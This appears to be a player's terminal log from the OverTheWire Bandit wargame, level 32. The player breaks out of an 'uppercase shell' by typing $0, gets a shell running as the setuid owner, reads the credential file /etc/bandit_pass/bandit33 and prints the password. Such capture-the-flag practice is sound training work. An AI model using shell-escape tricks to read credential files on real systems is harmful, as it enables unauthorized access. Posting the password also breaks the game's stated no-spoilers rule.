@@ -1,0 +1,211 @@
+Uppershell here transforms evrything to uppcase
+we break out by typing $0 after some commands
+
+b3twiise@phoenix:~/OTW/bandit$ ./connect.sh bandit32
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit32@bandit.labs.overthewire.org's password: 
+Linux bandit 4.18.12 x86_64 GNU/Linux
+               
+      ,----..            ,----,          .---. 
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' ' 
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      : 
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ; 
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"  
+     \   \ .'        ;   |.'       \   \ ;     
+  www. `---` ver     '---' he       '---" ire.org     
+               
+              
+Welcome to OverTheWire!
+
+If you find any problems, please report them to Steven or morla on
+irc.overthewire.org.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames. 
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
+  so that users can not snoop on eachother. Files and directories with 
+  easily guessable or short names will be periodically deleted!
+
+  Please play nice:
+      
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS! 
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro 
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few usefull tools which you can find
+ in the following locations:
+
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/
+    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us through IRC on
+  irc.overthewire.org #wargames.
+
+  Enjoy your stay!
+
+WELCOME TO THE UPPERCASE SHELL
+>> awk 
+sh: 1: AWK: not found
+>> shell
+sh: 1: SHELL: not found
+>> :v
+sh: 1: :V: not found
+>> path
+sh: 1: PATH: not found
+>> $path   
+sh: 1: /usr/local/bin:/usr/bin:/bin:/usr/games: not found
+>> $path | awk
+sh: 1: /usr/local/bin:/usr/bin:/bin:/usr/games: not found
+sh: 1: AWK: not found
+>> !
+sh: 2: Syntax error: newline unexpected
+>> :!
+sh: 1: :!: not found
+>> @
+sh: 1: @: not found
+>> #
+>> /
+sh: 1: /: Permission denied
+>> DKD
+sh: 1: DKD: not found
+>> ls
+sh: 1: LS: not found
+>> LS
+sh: 1: LS: not found
+>> LS"ls
+sh: 2: Syntax error: Unterminated quoted string
+>> ls"-la
+sh: 2: Syntax error: Unterminated quoted string
+>> ls"-la"
+sh: 1: LS-LA: not found
+>> ls" ls -la" 'ls #
+sh: 2: Syntax error: Unterminated quoted string
+>> ls" ls -la" 'ls -la' #
+sh: 1: LS LS -LA: not found
+>> ls -la " la# ls" 'ls'
+sh: 1: LS: not found
+>> ls; whoami
+sh: 1: LS: not found
+sh: 1: WHOAMI: not found
+>> 
+>> 
+>> 
+>> whoami
+sh: 1: WHOAMI: not found
+>> $0
+$ 
+$ ls
+uppershell
+$ ls -la
+total 28
+drwxr-xr-x  2 root     root     4096 Oct 16  2018 .
+drwxr-xr-x 41 root     root     4096 Oct 16  2018 ..
+-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
+-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
+-rw-r--r--  1 root     root      675 May 15  2017 .profile
+-rwsr-x---  1 bandit33 bandit32 7556 Oct 16  2018 uppershell
+$ cat uppershell
+ELF�4�▒4        (444  4@��hhhDDP�tdTTT44Q�tdR��/lib/ld-linux.so.2GNU GNU���W��+��w]����<w
+                                                                                         �( 
+                                                                                            �K��gUa:▒AV&Op !+^G
+                                                                                                               ,4@▒libc.so.6_IO_stdin_�@�dfflushexitputssetreuidstdinprintffgetstouppersystemgeteuid__libc_start_main__gmon_start__GLIBC_2.0ii
+▒ (�    ,�
+0�
+ S������������t���[��5��%
+                         h������%������%h������%▒h▒������%h ������% h(������%$h0������%(h8�p����%,h@�`����%0hH�P����%�f�1�^�����PTRhh�QVh�������f�f�f�f�f�f�f��$�f�f�f�f�f�f��?-<��v▒���tU����h<�Ѓ���Ð�t&�<-<���������t��tU����Ph<����Ít&��'�=DuU����|����D���f�����u듍v���t�U����P����u����L$����q�U��SQ���k������d����SP���������
+                                                       h0�Z�������
+                                                                  hO�
+�������
+������@��Ph�������P��������u
+��
+  j�/����E��0�������E�������
+                            P�<��������������E��E��������E�����u���
+                                                                   ������P��������V���f�f�f�f�f�f��UWVS�7�����G��
+                                                                                                                 �l$ ��
+                                                                                                                       �����������)�����t%1������t$,�t$,U���������9�u���
+                                  [^_]Ív��S���������▒�[�WELCOME TO THE UPPERCASE SHELL>> 0����L\���pg����\���������zR|
+                                                                                                                      X���F
+                                                                                                                           J
+                                                                                                                            tx?▒;*2$"@���$T�����D
+           GuDuxu|H|����]�A
+                           �A�A�N i$D(D,A0M GA�A�
+                                                 AA�������p�
+▒                                                          
+ ���o��Ё
+�
+ P����oX���o���o:&6FVfv���GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516Th���:x�  ��
+ 
+�
+�(T��
+   �▒4@▒�
+         .pDD▒S
+               z�������`����
+                            ��T▒-��4 CUgx<'�4��� ��8�,�-�]=@▒�H▒��N(U<▒a��fy<7
+                                                                             crtstuff.c__JCR_LIST__deregister_tm_clones__do_global_dtors_auxcompleted.6587__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryupper.c__FRAME_END____JCR_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini__x86.get_pc_thunk.bxprintf@@GLIBC_2.0fflush@@GLIBC_2.0fgets@@GLIBC_2.0_edatageteuid@@GLIBC_2.0__data_startputs@@GLIBC_2.0system@@GLIBC_2.0__gmon_start__exit@@GLIBC_2.0__dso_handle_IO_stdin_usedsetreuid@@GLIBC_2.0__libc_start_main@@GLIBC_2.0__libc_csu_initstdin@@GLIBC_2.0_fp_hw__bss_startmaintoupper@@GLIBC_2.0__TMC_END__.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rel.dyn.rel.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.jcr.dynamic.got.plt.data.bss.commentT#hh 1��$D���o��$N
+                                                                                                                                    ��V���^���o::k���oXX z    x�      B��P�#������R��((+�TT4�����
+                                                          �
+                                                          ������4�4@ 0<-l�/     ��
+$ 
+$ 
+$ 
+$ 
+$ ls -la
+total 28
+drwxr-xr-x  2 root     root     4096 Oct 16  2018 .
+drwxr-xr-x 41 root     root     4096 Oct 16  2018 ..
+-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
+-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
+-rw-r--r--  1 root     root      675 May 15  2017 .profile
+-rwsr-x---  1 bandit33 bandit32 7556 Oct 16  2018 uppershell
+$ cat /etc/bandit_pass/bandit32
+cat: /etc/bandit_pass/bandit32: Permission denied
+$ cat /etc/bandit_pass/bandit33
+c9c3199ddf4121b10cf581a98d51caee
+$ 
